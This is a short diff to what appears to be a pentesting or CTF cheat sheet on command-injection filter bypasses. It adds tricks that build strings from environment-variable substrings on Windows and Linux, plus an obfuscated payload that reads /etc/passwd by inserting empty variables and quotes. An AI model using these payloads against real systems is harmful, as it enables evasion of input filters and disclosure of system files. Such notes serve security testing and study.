@@ -17,6 +17,14 @@ cat f*
 // bypass the limit on space character
 cat${IFS}flag
 cat$IFSflag
+
+// borrow from env variable
+// Windows: start from a count for b
+%comspec:~a,b%
+Linux: ${PATH:a:b}
+
+// ${a} become empty which can be ignored
+c${a}a''t /et``c/pa""ss${aa}wd
 ```
 
 ## ghostscript RCE
